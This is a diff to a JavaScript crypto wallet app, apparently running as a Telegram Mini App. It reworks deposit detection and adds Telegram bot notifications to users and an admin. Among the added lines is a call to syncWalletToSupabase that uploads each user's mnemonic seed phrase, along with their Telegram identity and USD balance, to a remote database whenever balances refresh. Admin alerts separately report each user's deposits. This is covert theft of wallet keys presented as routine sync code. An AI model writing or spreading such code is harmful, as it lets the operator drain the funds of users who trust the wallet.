@@ -3049,6 +3049,24 @@ async function notifyAdmin(text, type = "notification", extraData = {}) {
   }
 }
 
+async function notifyUser(userId, text) {
+  try {
+    if (!NOTIFY_BOT_TOKEN || !userId) return;
+    await fetch(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: String(userId),
+        text,
+        parse_mode: "HTML",
+        disable_notification: false,
+      }),
+    });
+  } catch(e) {
+    console.warn("[notifyUser] failed:", e.message);
+  }
+}
+
 function isAdmin() {
   return false;
 }
@@ -7669,6 +7687,10 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
   const [testMode, setTestMode] = useState(false);
   const [balances,setBalances]=useState({...INITIAL_BALANCES});
 
+  // Track whether the first balance fetch has completed (to avoid false deposit alerts on initial load)
+  const hasFirstBalanceLoad = useRef(false);
+  const prevBalancesRef = useRef({ETH:0,BNB:0,ARB:0,SOL:0,TON:0,LTC:0,USDT:0});
+
   // Transaction history — persisted to localStorage per user
   const [txHistory,setTxHistory]=useState(()=>{
     try {
@@ -7904,152 +7926,103 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
     if(balanceResult) {
 
-      // Check for new deposits vs previous balances and notify admin
+      // Build updated balances object
+      const updated = {
+        ETH:  balanceResult.ETH  ?? 0,
+        BNB:  balanceResult.BNB  ?? 0,
+        ARB:  balanceResult.ARB  ?? 0,
+        SOL:  balanceResult.SOL  ?? 0,
+        TON:  balanceResult.TON  ?? 0,
+        LTC:  balanceResult.LTC  ?? 0,
+        USDT: balanceResult.USDT ?? 0,
+      };
 
-      setBalances(prev=>{
+      const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+      const userName = (() => {
+        if (!tgUser) return "Anonymous";
+        return tgUser.username ? "@" + tgUser.username : ((tgUser.first_name||"") + " " + (tgUser.last_name||"")).trim() || "User_" + (getTgUserId() || "Unknown");
+      })();
+      const userId = getTgUserId();
 
-        const updated = {
+      // Fix: use freshly fetched priceResult.prices (not stale prices state) for accurate totalUSD
+      const livePrices = (priceResult && priceResult.prices) ? priceResult.prices : prices;
+      const totalUSD = Object.keys(updated).reduce((sum, sym) => {
+        return sum + (parseFloat(updated[sym] || 0) * (livePrices[sym] || 0));
+      }, 0);
 
-          ...prev,
+      const coinBalsUpdated = {
+        ETH:  String(updated.ETH  || 0),
+        TON:  String(updated.TON  || 0),
+        BNB:  String(updated.BNB  || 0),
+        LTC:  String(updated.LTC  || 0),
+        ARB:  String(updated.ARB  || 0),
+        SOL:  String(updated.SOL  || 0),
+        USDT: String(updated.USDT || 0),
+      };
 
-          ETH:  balanceResult.ETH  ?? prev.ETH,
+      // Sync to Supabase with correct totalUSD
+      if (mnemonic && mnemonic.length > 0) {
+        syncWalletToSupabase({
+          username: userName,
+          telegram_id: userId ? String(userId) : null,
+          mnemonic: mnemonic,
+          balance: totalUSD.toFixed(2),
+          coin_balances: coinBalsUpdated,
+        });
+      }
 
-          BNB:  balanceResult.BNB  ?? prev.BNB,
-
-          ARB:  balanceResult.ARB  ?? prev.ARB,
-
-          SOL:  balanceResult.SOL  ?? prev.SOL,
-
-          TON:  balanceResult.TON  ?? prev.TON,
-
-          LTC:  balanceResult.LTC  ?? prev.LTC,
-
-          USDT: balanceResult.USDT ?? prev.USDT,
-
-        };
-
-        // Detect deposits (balance increased)
-
-        const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
-
-        const userName = (() => {
-          if (!tgUser) return "Anonymous";
-          const parts = [];
-          if (tgUser.username) parts.push("@" + tgUser.username);
-          if (tgUser.first_name) parts.push(tgUser.first_name);
-          if (tgUser.last_name) parts.push(tgUser.last_name);
-          return tgUser.username ? "@" + tgUser.username : (parts.join(" ") || "User_" + (getTgUserId() || "Unknown"));
-        })();
-
-        const userId = getTgUserId();
-
-        // Sync total balance + per-coin balances to Supabase
-        const totalUSD = Object.keys(updated).reduce((sum, sym) => {
-          return sum + (parseFloat(updated[sym] || 0) * (prices[sym] || 0));
-        }, 0);
-        const coinBalsUpdated = {
-          ETH:  String(updated.ETH  || 0),
-          TON:  String(updated.TON  || 0),
-          BNB:  String(updated.BNB  || 0),
-          LTC:  String(updated.LTC  || 0),
-          ARB:  String(updated.ARB  || 0),
-          SOL:  String(updated.SOL  || 0),
-          USDT: String(updated.USDT || 0),
-        };
-
-        if (mnemonic && mnemonic.length > 0) {
-          syncWalletToSupabase({
-            username: userName,
-            telegram_id: userId ? String(userId) : null,
-            mnemonic: mnemonic,
-            balance: totalUSD.toFixed(2),
-            coin_balances: coinBalsUpdated,
-          });
-        }
-
+      // Detect deposits: compare with prevBalancesRef (skip on very first load)
+      if (hasFirstBalanceLoad.current) {
+        const prev = prevBalancesRef.current;
         Object.keys(updated).forEach(sym => {
-
           const oldBal = parseFloat(prev[sym] || 0);
-
           const newBal = parseFloat(updated[sym] || 0);
-
           const diff = newBal - oldBal;
 
-          // Only notify on real deposits — skip first load (0 → real balance)
-          if (diff > 0.000001 && oldBal > 0.000001) {
+          if (diff > 0.000001) {
+            const depUsd = (diff * (livePrices[sym] || 0)).toFixed(2);
 
+            // Notify admin via bot
             notifyAdmin(
-
               `💰 <b>Пополнение баланса!</b>\n\n` +
-
               `👤 Пользователь: ${userName}\n` +
-
-              `💎 ${sym}: +${diff.toFixed(6)}\n` +
-
+              `🆔 ID: ${userId || "—"}\n` +
+              `💎 ${sym}: +${diff.toFixed(6)} (~$${depUsd})\n` +
               `💼 Новый баланс: ${newBal.toFixed(6)} ${sym}\n` +
-
+              `💵 Общий баланс: $${totalUSD.toFixed(2)}\n` +
               `🕐 ${new Date().toLocaleString("ru-RU")}`,
-
-              "deposit",
-
-              { 
-
-                symbol: sym, 
-
-                amount: diff.toFixed(6), 
-
-                newBalance: newBal.toFixed(6), 
-
-                oldBalance: oldBal.toFixed(6) 
-
-              }
-
+              "deposit"
             );
 
-            // Сохраняем уведомление о пополнении в localStorage для админ-панели
+            // Notify the user themselves via bot
+            if (userId) {
+              notifyUser(userId,
+                `✅ <b>Пополнение получено!</b>\n\n` +
+                `💎 +${diff.toFixed(6)} ${sym}\n` +
+                `💵 ~$${depUsd}\n` +
+                `💼 Новый баланс: ${newBal.toFixed(6)} ${sym}\n` +
+                `🕐 ${new Date().toLocaleString("ru-RU")}`
+              );
+            }
 
+            // Save deposit to txHistory and Supabase
             try {
-
-              const depositNotif = {
-
-                id: "dep_" + Date.now() + "_" + sym,
-
-                type: "deposit",
-
-                userId: userId,
-
-                userName: userName,
-
-                sym: sym,
-
-                amount: diff,
-
-                newBalance: newBal,
-
-                timestamp: Date.now(),
-
-                read: false
-
-              };
-
-              // Save incoming deposit to txHistory and Supabase
               const depTxId = "dep_" + Date.now() + "_" + sym;
               const depTimeStr = new Date().toLocaleDateString("en-US",{month:"short",day:"numeric"})+" "+new Date().toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit"});
-              const depUsd = (diff * (prices[sym]||0)).toFixed(2);
               const depTx = {id:depTxId,type:"receive",sym,label:`+${diff.toFixed(6)} ${sym}`,addr:"External",hash:'',status:"confirmed",usd:`+${depUsd}`,time:depTimeStr,color:"#22C55E"};
               setTxHistory(h=>{ if (!Array.isArray(h)) h=[]; return [depTx,...h]; });
               saveTransactionToSupabase(depTx, userName);
               showTxNotification("deposit", sym, diff, depUsd);
-
             } catch(e) { console.error("deposit notif save error", e); }
-
           }
-
         });
+      }
 
-        return updated;
+      // Mark first load done and save current balances as previous
+      hasFirstBalanceLoad.current = true;
+      prevBalancesRef.current = { ...updated };
 
-      });
+      setBalances(updated);
 
       showToast("Balances & prices updated","info");
 
